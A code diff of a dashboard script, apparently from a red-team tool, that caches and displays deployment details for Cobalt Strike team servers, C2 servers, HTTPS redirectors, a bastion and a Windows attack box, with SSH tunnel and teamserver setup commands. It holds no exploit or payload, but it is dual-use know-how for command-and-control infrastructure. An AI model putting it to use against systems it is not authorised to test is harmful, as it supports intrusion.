@@ -4883,8 +10589,8 @@ async function startDeploymentResources(projectName) {
 
             const instanceList = (data.instances || []).map(i =>
                 `<div style="padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                    <span style="color: var(--success-text);">&#9654;</span>
-                    <strong style="color: var(--text-primary);">${escapeHtml(i.name)}</strong>
+                    <span class="t-success">&#9654;</span>
+                    <strong class="t-primary">${escapeHtml(i.name)}</strong>
                     <span style="color: var(--text-muted); font-size: 0.88em;">(${i.id} &middot; ${i.type})</span>
                 </div>`
             ).join('');
@@ -4894,7 +10600,7 @@ async function startDeploymentResources(projectName) {
                     <summary style="cursor: pointer; color: var(--success-text); font-weight: bold;">
                         ${data.started_count} instance${data.started_count !== 1 ? 's' : ''} starting
                     </summary>
-                    <div style="background: var(--bg-terminal); padding: 10px; border-radius: 6px; margin-top: 6px; font-family: monospace; font-size: 0.88em;">
+                    <div class="terminal-block" style="font-size: 0.88em; margin-top: 6px;">
                         ${instanceList}
                     </div>
                 </details>` : '';
@@ -4952,34 +10658,82 @@ window.startDeploymentResources = startDeploymentResources;
 /**
  * Destroy infrastructure for a specific project
  */
-async function destroyDeployment(projectName) {
-    if (!projectName) {
-        showMessage('Project name is required', 'error');
-        return;
+// Make destroy/purge confirmation functions available globally for onclick handlers
+window.showDestroyConfirmation = showDestroyConfirmation;
+window.hideDestroyConfirmation = hideDestroyConfirmation;
+window.executeDestroyConfirmation = executeDestroyConfirmation;
+
+/**
+ * Fetch and cache per-project deployment data.
+ * Returns cached data immediately if available, otherwise fetches from API.
+ */
+async function loadProjectData(projectName) {
+    if (!projectName) return null;
+    const cached = getProjectData(projectName);
+    if (cached) return cached;
+    try {
+        const response = await fetch(`${API_BASE}/deploy/outputs?project=${encodeURIComponent(projectName)}`);
+        const data = await response.json();
+        if (!data.success || !data.outputs) return null;
+        const outputs = data.outputs;
+        const projectData = {
+            outputs: outputs,
+            deployment_type: outputs.deployment_type || '',
+            bastion: {
+                public_ip: outputs.bastion_public_ip || '',
+                private_ip: outputs.bastion_private_ip || '',
+                instance_id: outputs.bastion_instance_id || '',
+                enabled: !!outputs.bastion_public_ip,
+            },
+            c2_servers: {
+                servers: (outputs.c2_servers || []).reduce((acc, s, i) => { acc[`server-${i}`] = s; return acc; }, {}),
+                private_ips: (outputs.c2_servers || []).map(s => s.private_ip),
+                instance_ids: (outputs.c2_servers || []).map(s => s.instance_id),
+            },
+            redirectors: {
+                public_ips: (outputs.redirectors || []).map(r => r.public_ip),
+                private_ips: (outputs.redirectors || []).map(r => r.private_ip),
+                instance_ids: (outputs.redirectors || []).map(r => r.instance_id),
+            },
+            attack_box: {
+                enabled: !!outputs.attackbox_private_ip,
+                private_ip: outputs.attackbox_private_ip || '',
+                admin_password: outputs.attackbox_password || '',
+                instance_id: outputs.attackbox_instance_id || '',
+            },
+            config: {
+                redirector_domain: outputs.redirector_domain || outputs.primary_domain_name || '',
+                primary_domain_name: outputs.primary_domain_name || outputs.redirector_domain || '',
+                c2_subdomain: outputs.c2_subdomain || 'api',
+                cs_teamserver_password: outputs.cs_teamserver_password || '',
+                cobalt_strike_license_secret_name: outputs.cobalt_strike_license_secret_name || '',
+                malleable_profile: outputs.malleable_profile || '',
+                deployment_type: outputs.deployment_type || '',
+            },
+            jumpbox_public_ip: outputs.jumpbox_public_ip || '',
+            teamserver_private_ip: outputs.teamserver_private_ip || '',
+        };
+        setProjectData(projectName, projectData);
+        return projectData;
+    } catch (e) {
+        console.error(`Failed to load project data for ${projectName}:`, e);
+        return null;
     }
-
-    // Get resources from cache for this project
-    const cached = loadResourceCache();
-    const projectResources = cached
-        ? (cached.resources || []).filter(r => r.project === projectName)
-        : [];
-
-    // Show review modal in destroy mode
-    showPurgeReviewModal(projectName, projectResources, 'destroy');
 }
-
-// Make destroyDeployment available globally for onclick handlers
-window.destroyDeployment = destroyDeployment;
 
 /**
  * Load connection info for a specific project
  */
 async function loadConnectionInfo(projectName, sessionId) {
     if (!projectName) return;
-    
+
     const contentDiv = document.getElementById(`${sessionId}-connection-content`);
     if (!contentDiv) return;
-    
+
+    // Skip if already loaded (not still showing placeholder text)
+    const text = contentDiv.textContent.trim();
+    if (text !== 'Loading connection details...' && text !== '') return;
+
     contentDiv.innerHTML = '<div class="spinner" style="margin: 10px auto;"></div> Loading connection details...';
     
     try {
@@ -4988,12 +10742,41 @@ async function loadConnectionInfo(projectName, sessionId) {
         const data = await response.json();
         
         if (!data.success || !data.outputs) {
-            contentDiv.innerHTML = `<div style="color: var(--text-secondary);">No connection details available. ${data.error || ''}</div>`;
+            contentDiv.innerHTML = `<div class="t-secondary">No connection details available. ${data.error || ''}</div>`;
             return;
         }
         
         const outputs = data.outputs;
-        
+
+        // Cache normalized project data for other consumers (checklist, etc.)
+        if (!getProjectData(projectName)) {
+            const pd = {
+                outputs: outputs,
+                deployment_type: outputs.deployment_type || '',
+                bastion: { public_ip: outputs.bastion_public_ip || '', private_ip: outputs.bastion_private_ip || '', instance_id: outputs.bastion_instance_id || '', enabled: !!outputs.bastion_public_ip },
+                c2_servers: {
+                    servers: (outputs.c2_servers || []).reduce((acc, s, i) => { acc[`server-${i}`] = s; return acc; }, {}),
+                    private_ips: (outputs.c2_servers || []).map(s => s.private_ip),
+                    instance_ids: (outputs.c2_servers || []).map(s => s.instance_id),
+                },
+                redirectors: {
+                    public_ips: (outputs.redirectors || []).map(r => r.public_ip),
+                    private_ips: (outputs.redirectors || []).map(r => r.private_ip),
+                    instance_ids: (outputs.redirectors || []).map(r => r.instance_id),
+                },
+                attack_box: { enabled: !!outputs.attackbox_private_ip, private_ip: outputs.attackbox_private_ip || '', admin_password: outputs.attackbox_password || '', instance_id: outputs.attackbox_instance_id || '' },
+                config: {
+                    redirector_domain: outputs.redirector_domain || '', primary_domain_name: outputs.primary_domain_name || '',
+                    c2_subdomain: outputs.c2_subdomain || 'api', cs_teamserver_password: outputs.cs_teamserver_password || '',
+                    cobalt_strike_license_secret_name: outputs.cobalt_strike_license_secret_name || '',
+                    deployment_type: outputs.deployment_type || '',
+                },
+                jumpbox_public_ip: outputs.jumpbox_public_ip || '',
+                teamserver_private_ip: outputs.teamserver_private_ip || '',
+            };
+            setProjectData(projectName, pd);
+        }
+
         // Get user's key path from their uploaded public key comment
         let userKeyPath = '~/.ssh/your_key';  // Default fallback
         let keyComment = null;
@@ -5049,7 +10832,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                 <div style="background: var(--bg-card); padding: 12px; border-radius: 6px; margin-bottom: 10px;">
                     <div style="font-weight: 500; color: var(--info-text); margin-bottom: 8px;">📋 How it works:</div>
                     <ol style="margin: 0; padding-left: 20px; color: var(--text-secondary); font-size: 0.88em; line-height: 1.7;">
-                        <li>You generated your key pair locally: <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">ssh-keygen -t ed25519</code></li>
+                        <li>You generated your key pair locally: <code class="code-inline">ssh-keygen -t ed25519</code></li>
                         <li>You uploaded your <strong>public key</strong> before deployment</li>
                         <li>Your <strong>private key</strong> stays on your machine — never transmitted</li>
                         <li>The jumpbox was provisioned with your public key in <code>authorized_keys</code></li>
@@ -5057,7 +10840,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                 </div>
                 `}
                 <div style="font-size: 0.88em; color: var(--text-muted); display: flex; align-items: center; gap: 6px;">
-                    <span style="color: var(--success-text);">✅</span> No private keys are stored on servers or transmitted via API
+                    <span class="t-success">✅</span> No private keys are stored on servers or transmitted via API
                 </div>
             </div>
         `;
@@ -5069,14 +10852,14 @@ async function loadConnectionInfo(projectName, sessionId) {
             html += `
                 <div style="margin-bottom: 15px; padding: 12px; background: var(--success-bg); border-radius: 6px; border-left: 4px solid var(--success);">
                     <div style="font-weight: 600; color: var(--success-text); margin-bottom: 8px;">🖥️ Jumpbox SSH Access</div>
-                    <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.jumpbox_public_ip}</code></div>
-                    <div style="margin-bottom: 8px;"><strong>User:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">ubuntu</code></div>
+                    <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code class="code-inline">${outputs.jumpbox_public_ip}</code></div>
+                    <div style="margin-bottom: 8px;"><strong>User:</strong> <code class="code-inline">ubuntu</code></div>
                     <div style="position: relative; background: var(--bg-terminal); border-radius: 4px; overflow: hidden;">
                         <button onclick="copyToClipboard('${escapedSshCommand}', this)" 
                                 style="position: absolute; top: 8px; right: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.75em; z-index: 10;">
                             📋 Copy
                         </button>
-                        <div style="color: var(--accent-muted); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.95em; overflow-x: auto; white-space: nowrap;">
+                        <div style="color: var(--text-terminal); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.95em; overflow-x: auto; white-space: nowrap;">
                             ${sshCommand}
                         </div>
                     </div>
@@ -5096,7 +10879,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--info-bg); border-radius: 6px; border-left: 4px solid var(--info);">
                         <div style="font-weight: 600; color: var(--info-text); margin-bottom: 8px;">🪟 Windows DC01 (via Jumpbox)</div>
-                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.dc01_private_ip}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code class="code-inline">${outputs.dc01_private_ip}</code></div>
                         <div style="margin-bottom: 8px;"><strong>Access:</strong> RDP through SSH tunnel</div>
                         
                         <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 6px; font-size: 0.9em;">Step 1: Create SSH Tunnel (run on YOUR local machine)</div>
@@ -5105,7 +10888,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                                     style="position: absolute; top: 8px; right: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.75em; z-index: 10;">
                                 📋 Copy
                             </button>
-                            <div style="color: var(--accent-muted); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.95em; overflow-x: auto;">
+                            <div style="color: var(--text-terminal); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.95em; overflow-x: auto;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># SSH tunnel for RDP</div>
                                 <div style="white-space: nowrap;">${tunnelCommand}</div>
                             </div>
@@ -5129,7 +10912,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                             <div style="font-size: 0.8em; color: var(--text-secondary); line-height: 1.5;">
                                 If you're already on the jumpbox and want to create an RDP tunnel, use the internal key:
                             </div>
-                            <code style="display: block; margin-top: 6px; background: var(--bg-terminal); padding: 6px 8px; border-radius: 3px; font-size: 0.75em; color: var(--text-primary);">
+                            <code class="terminal-block" style="display: block; margin-top: 6px; padding: 6px 8px; font-size: 0.75em;">
                                 ssh -i ~/.ssh/jumpbox_internal_key -L 3389:${outputs.dc01_private_ip}:3389 ubuntu@${outputs.jumpbox_public_ip}
                             </code>
                         </div>
@@ -5142,17 +10925,17 @@ async function loadConnectionInfo(projectName, sessionId) {
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--danger-bg); border-radius: 6px; border-left: 4px solid var(--danger);">
                         <div style="font-weight: 600; color: var(--danger-text); margin-bottom: 8px;">🎯 Cobalt Strike Team Server (Direct)</div>
-                        <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.team_server_public_ip}</code></div>
-                        <div style="margin-bottom: 8px;"><strong>Port:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">50050</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code class="code-inline">${outputs.team_server_public_ip}</code></div>
+                        <div style="margin-bottom: 8px;"><strong>Port:</strong> <code class="code-inline">50050</code></div>
                         
                         <!-- License Activation Notice -->
                         <div style="margin: 10px 0; padding: 10px; background: var(--warning-bg); border-radius: 4px; border: 1px solid var(--warning-border);">
                             <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 6px; font-size: 0.9em;">⚠️ License Activation & Password Setup Required</div>
                             <div style="font-size: 0.88em; color: var(--text-primary); line-height: 1.4; margin-bottom: 8px;">
-                                SSH to the server and run <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">cd /opt/cobaltstrike && sudo ./update</code> to activate your license.
+                                SSH to the server and run <code class="code-inline">cd /opt/cobaltstrike && sudo ./update</code> to activate your license.
                             </div>
                             <div style="font-size: 0.88em; color: var(--text-primary); line-height: 1.4;">
-                                Then start with password: <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">cd /opt/cobaltstrike/server && sudo ./teamserver ${outputs.team_server_public_ip} YourPassword</code>
+                                Then start with password: <code class="code-inline">cd /opt/cobaltstrike/server && sudo ./teamserver ${outputs.team_server_public_ip} YourPassword</code>
                             </div>
                         </div>
                         
@@ -5171,8 +10954,8 @@ async function loadConnectionInfo(projectName, sessionId) {
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--danger-bg); border-radius: 6px; border-left: 4px solid var(--danger);">
                         <div style="font-weight: 600; color: var(--danger-text); margin-bottom: 8px;">🔴 CS Team Server (Ubuntu)</div>
-                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.teamserver_private_ip}</code></div>
-                        <div style="margin-bottom: 5px;"><strong>CS Port:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">50050</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code class="code-inline">${outputs.teamserver_private_ip}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>CS Port:</strong> <code class="code-inline">50050</code></div>
                         
                         <!-- License Activation Notice -->
                         <div style="margin: 12px 0; padding: 12px; background: var(--warning-bg); border-radius: 6px; border: 1px solid var(--warning-border);">
@@ -5184,11 +10967,11 @@ async function loadConnectionInfo(projectName, sessionId) {
                                 This is a <strong>one-time manual step</strong> that requires your license key.
                             </div>
                             <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 6px; font-size: 0.88em;">Steps to activate:</div>
-                            <div style="background: var(--bg-terminal); border-radius: 4px; padding: 10px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; margin-bottom: 8px;">
+                            <div class="terminal-block" style="font-size: 0.88em; margin-bottom: 8px;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># 1. SSH to Team Server (from Jumpbox)</div>
-                                <div style="color: var(--accent-muted); margin-bottom: 8px;">ssh teamserver</div>
+                                <div style="color: var(--text-terminal); margin-bottom: 8px;">ssh teamserver</div>
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># 2. Run the license activation</div>
-                                <div style="color: var(--accent-muted); margin-bottom: 8px;">${activateLicenseCmd}</div>
+                                <div style="color: var(--text-terminal); margin-bottom: 8px;">${activateLicenseCmd}</div>
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># 3. Enter your license key when prompted</div>
                             </div>
                         </div>
@@ -5203,13 +10986,13 @@ async function loadConnectionInfo(projectName, sessionId) {
                                 Choose a strong password - you'll need it to connect the CS Client.
                             </div>
                             <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 6px; font-size: 0.88em;">Start team server with password:</div>
-                            <div style="background: var(--bg-terminal); border-radius: 4px; padding: 10px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; margin-bottom: 8px;">
+                            <div class="terminal-block" style="font-size: 0.88em; margin-bottom: 8px;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># Start the team server</div>
-                                <div style="color: var(--accent-muted); margin-bottom: 4px;">cd /opt/cobaltstrike/server</div>
-                                <div style="color: var(--accent-muted);">sudo ./teamserver ${outputs.teamserver_private_ip} YourPasswordHere</div>
+                                <div style="color: var(--text-terminal); margin-bottom: 4px;">cd /opt/cobaltstrike/server</div>
+                                <div class="t-terminal">sudo ./teamserver ${outputs.teamserver_private_ip} YourPasswordHere</div>
                             </div>
                             <div style="font-size: 0.8em; color: var(--text-secondary); padding: 8px; background: var(--bg-card); border-radius: 4px; margin-bottom: 8px;">
-                                💡 <strong>Keep it running:</strong> Use <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">screen</code> or <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">tmux</code> to run in background: <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">screen -S teamserver</code> then start the server.
+                                💡 <strong>Keep it running:</strong> Use <code class="code-inline">screen</code> or <code class="code-inline">tmux</code> to run in background: <code class="code-inline">screen -S teamserver</code> then start the server.
                             </div>
                             <div style="font-size: 0.8em; color: var(--text-secondary); padding: 8px; background: var(--bg-card); border-radius: 4px;">
                                 💡 <strong>Remember this password!</strong> You'll use it to connect the CS Client to this team server on port 50050.
@@ -5220,9 +11003,9 @@ async function loadConnectionInfo(projectName, sessionId) {
                         </div>
                         
                         <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 6px; font-size: 0.9em;">Verify team server is running:</div>
-                        <div style="background: var(--bg-terminal); border-radius: 4px; padding: 10px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; margin-bottom: 12px;">
-                            <div style="color: var(--accent-muted); margin-bottom: 4px;">sudo systemctl status teamserver</div>
-                            <div style="color: var(--accent-muted);">sudo netstat -tlnp | grep 50050</div>
+                        <div class="terminal-block" style="font-size: 0.88em; margin-bottom: 12px;">
+                            <div style="color: var(--text-terminal); margin-bottom: 4px;">sudo systemctl status teamserver</div>
+                            <div class="t-terminal">sudo netstat -tlnp | grep 50050</div>
                         </div>
                     </div>
                 `;
@@ -5241,9 +11024,9 @@ async function loadConnectionInfo(projectName, sessionId) {
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--success-bg); border-radius: 6px; border-left: 4px solid var(--success);">
                         <div style="font-weight: 600; color: var(--success-text); margin-bottom: 8px;">🖥️ Windows Attack Box (CS Client + Tools)</div>
-                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.attackbox_private_ip}</code></div>
-                        <div style="margin-bottom: 5px;"><strong>OS:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">Windows Server 2019</code></div>
-                        <div style="margin-bottom: 5px;"><strong>Login:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">Administrator / ${attackboxPassword}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Private IP:</strong> <code class="code-inline">${outputs.attackbox_private_ip}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>OS:</strong> <code class="code-inline">Windows Server 2019</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Login:</strong> <code class="code-inline">Administrator / ${attackboxPassword}</code></div>
                         <div style="margin-bottom: 10px; font-size: 0.9em; color: var(--text-secondary);">
                             Your attack workstation with CS Client, PowerSploit, and WSL2.
                         </div>
@@ -5257,7 +11040,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                                     style="position: absolute; top: 8px; right: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.75em; z-index: 10;">
                                 📋 Copy
                             </button>
-                            <div style="color: var(--accent-muted); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; overflow-x: auto;">
+                            <div style="color: var(--text-terminal); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; overflow-x: auto;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># SSH tunnel for RDP</div>
                                 <div style="white-space: nowrap;">${rdpTunnelCommand}</div>
                             </div>
@@ -5278,7 +11061,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                         
                         <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 6px; font-size: 0.9em;">🔗 Option 2: SSH from Jumpbox (Command Line)</div>
                         <div style="position: relative; background: var(--bg-terminal); border-radius: 4px; overflow: hidden; margin-bottom: 12px;">
-                            <div style="color: var(--accent-muted); padding: 12px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em;">
+                            <div style="color: var(--text-terminal); padding: 12px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># From the jumpbox, SSH directly to Attack Box</div>
                                 <div>ssh attackbox</div>
                                 <div style="color: var(--text-muted); margin-top: 4px;"># Or: ssh Administrator@192.168.56.50</div>
@@ -5300,7 +11083,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                 // LOCAL CS Client option (run CS from user's local machine)
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--bg-section); border-radius: 6px; border-left: 4px solid var(--brand);">
-                        <div style="font-weight: 600; color: var(--accent-muted); margin-bottom: 8px;">💻 Run CS Client from YOUR Local Machine</div>
+                        <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 8px;">💻 Run CS Client from YOUR Local Machine</div>
                         <div style="margin-bottom: 10px; font-size: 0.9em; color: var(--text-secondary);">
                             Prefer to run Cobalt Strike Client on your own machine? Use SSH tunneling:
                         </div>
@@ -5311,11 +11094,11 @@ async function loadConnectionInfo(projectName, sessionId) {
                                     style="position: absolute; top: 8px; right: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.75em; z-index: 10;">
                                 📋 Copy
                             </button>
-                            <div style="color: var(--accent-muted); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; overflow-x: auto;">
+                            <div style="color: var(--text-terminal); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.88em; overflow-x: auto;">
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># Step 1: Create SSH tunnel to Team Server (run on your local machine)</div>
                                 <div style="white-space: nowrap; margin-bottom: 8px;">${localCsTunnelCommand}</div>
                                 <div style="color: var(--text-muted); margin-bottom: 4px;"># Step 2: Keep terminal open, then launch your local CS Client</div>
-                                <div style="color: var(--text-muted);"># Step 3: Connect CS Client to: localhost:50050</div>
+                                <div class="t-muted"># Step 3: Connect CS Client to: localhost:50050</div>
                             </div>
                         </div>
                         
@@ -5324,7 +11107,7 @@ async function loadConnectionInfo(projectName, sessionId) {
                             <ol style="margin: 0; padding-left: 20px; color: var(--text-secondary); line-height: 1.6;">
                                 <li>Run the SSH tunnel command above (keep terminal open)</li>
                                 <li>Launch Cobalt Strike on your local machine</li>
-                                <li>Connect to: <code style="background: var(--bg-terminal); padding: 1px 4px; border-radius: 2px;">localhost:50050</code></li>
+                                <li>Connect to: <code class="code-inline">localhost:50050</code></li>
                                 <li>Use the team server password you configured</li>
                             </ol>
                         </div>
@@ -5341,25 +11124,140 @@ async function loadConnectionInfo(projectName, sessionId) {
                 html += `
                     <div style="margin-bottom: 15px; padding: 12px; background: var(--warning-bg); border-radius: 6px; border-left: 4px solid var(--warning);">
                         <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 8px;">🔀 HTTPS Redirector</div>
-                        <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.redirector_public_ip}</code></div>
-                        <div style="margin-bottom: 5px;"><strong>Domain:</strong> <code style="background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px;">${outputs.redirector_domain || 'N/A'}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Public IP:</strong> <code class="code-inline">${outputs.redirector_public_ip}</code></div>
+                        <div style="margin-bottom: 5px;"><strong>Domain:</strong> <code class="code-inline">${outputs.redirector_domain || 'N/A'}</code></div>
                     </div>
                 `;
             }
             
+            // --- C2 Infrastructure (Bastion, C2 Servers, Redirectors) ---
+            const keyPath = outputs.key_pair_name ? `~/.ssh/${outputs.key_pair_name}.pem` : userKeyPath;
+            const bastionIp = outputs.bastion_public_ip;
+
+            if (bastionIp) {
+                const bastionSsh = `ssh -i ${keyPath} ubuntu@${bastionIp}`;
+                const bastionRdp = `ssh -L 3389:localhost:3389 -i ${keyPath} ubuntu@${bastionIp}`;
+                html += `
+                    <div style="margin-bottom: 15px; padding: 12px; background: var(--bg-section); border-radius: 6px; border-left: 4px solid var(--brand);">
+                        <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px;">Bastion Host</div>
+                        <div style="display: flex; gap: 15px; margin-bottom: 8px; font-size: 0.9em;">
+                            <div><strong>Public IP:</strong> <code class="code-inline">${bastionIp}</code></div>
+                            ${outputs.bastion_private_ip ? `<div><strong>Private IP:</strong> <code class="code-inline">${outputs.bastion_private_ip}</code></div>` : ''}
+                        </div>
+                        ${renderCopyableCommand('SSH:', bastionSsh)}
+                        ${renderCopyableCommand('RDP Port Forward:', bastionRdp)}
+                    </div>
+                `;
+            }
+
+            if (outputs.c2_servers && outputs.c2_servers.length > 0) {
+                html += `<div style="margin-bottom: 15px;">`;
+                for (const server of outputs.c2_servers) {
+                    if (!server.private_ip) continue;
+                    const sshViaBastion = bastionIp ? `ssh -J ubuntu@${bastionIp} -i ${keyPath} ubuntu@${server.private_ip}` : '';
+                    const csPortFwd = bastionIp ? `ssh -L 50050:${server.private_ip}:50050 -i ${keyPath} ubuntu@${bastionIp}` : '';
+                    html += `
+                        <div style="padding: 12px; background: var(--danger-bg); border-radius: 6px; border-left: 4px solid var(--danger); margin-bottom: 10px;">
+                            <div style="font-weight: 600; color: var(--danger-text); margin-bottom: 8px;">${server.name || 'C2 Server'}</div>
+                            <div style="display: flex; gap: 15px; margin-bottom: 8px; font-size: 0.9em; flex-wrap: wrap;">
+                                <div><strong>Instance:</strong> <code style="font-size: 0.85em;">${server.instance_id}</code></div>
+                                <div><strong>Private IP:</strong> <code class="code-inline">${server.private_ip}</code></div>
+                                ${server.phase ? `<div><strong>Phase:</strong> <span style="background: var(--danger-bg); padding: 2px 6px; border-radius: 3px;">${server.phase}</span></div>` : ''}
+                            </div>
+                            ${sshViaBastion ? renderCopyableCommand('SSH via Bastion:', sshViaBastion) : ''}
+                            ${csPortFwd ? renderCopyableCommand('CS Port Forward:', csPortFwd) : ''}
+                        </div>
+                    `;
+                }
+                html += `</div>`;
+            }
+
+            if (outputs.redirectors && outputs.redirectors.length > 0) {
+                html += `<div style="margin-bottom: 15px;">`;
+                for (const redir of outputs.redirectors) {
+                    const redirSsh = redir.public_ip ? `ssh -i ${keyPath} ubuntu@${redir.public_ip}` : '';
+                    html += `
+                        <div style="padding: 12px; background: var(--success-bg); border-radius: 6px; border-left: 4px solid var(--success); margin-bottom: 10px;">
+                            <div style="font-weight: 600; color: var(--success-text); margin-bottom: 8px;">${redir.name || 'Redirector'}</div>
+                            <div style="display: flex; gap: 15px; margin-bottom: 8px; font-size: 0.9em; flex-wrap: wrap;">
+                                <div><strong>Instance:</strong> <code style="font-size: 0.85em;">${redir.instance_id}</code></div>
+                                ${redir.public_ip ? `<div><strong>Public IP:</strong> <code class="code-inline">${redir.public_ip}</code></div>` : ''}
+                                ${redir.private_ip ? `<div><strong>Private IP:</strong> <code class="code-inline">${redir.private_ip}</code></div>` : ''}
+                            </div>
+                            ${redirSsh ? renderCopyableCommand('SSH:', redirSsh) : ''}
+                        </div>
+                    `;
+                }
+                html += `</div>`;
+            }
+
+            // CS Team Server Password
+            if (outputs.cs_teamserver_password) {
+                html += `
+                    <div style="margin-bottom: 15px; padding: 12px; background: var(--bg-section); border-radius: 6px; border-left: 4px solid var(--warning);">
+                        <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 8px;">Cobalt Strike Team Server Password</div>
+                        <p style="margin: 0 0 6px 0; font-size: 0.9em; color: var(--text-secondary);">Pre-set during deployment. Used for CS client connections on port 50050.</p>
+                        ${renderCopyableCommand('', outputs.cs_teamserver_password)}
+                        <p style="margin: 8px 0 0 0; font-size: 0.85em; color: var(--text-muted);">To change: SSH to the C2 server and run <code class="code-inline">sudo /opt/cobaltstrike/set-password.sh</code></p>
+                    </div>
+                `;
+            } else if (outputs.c2_servers && outputs.c2_servers.length > 0) {
+                html += `
+                    <div style="margin-bottom: 15px; padding: 12px; background: var(--bg-section); border-radius: 6px; border-left: 4px solid var(--warning);">
+                        <div style="font-weight: 600; color: var(--warning-text); margin-bottom: 8px;">Cobalt Strike Team Server Password</div>
+                        <p style="margin: 0 0 6px 0; font-size: 0.9em; color: var(--warning-text);">Not yet configured. SSH to the C2 server and set it before connecting your CS client:</p>
+                        ${renderCopyableCommand('', 'sudo /opt/cobaltstrike/set-password.sh')}
+                    </div>
+                `;
+            }
+
+            // DNS Nameservers (if domain is configured with Route 53)
+            if (outputs.dns_nameservers && outputs.dns_nameservers.length > 0) {
+                const nsListHtml = outputs.dns_nameservers.map(ns =>
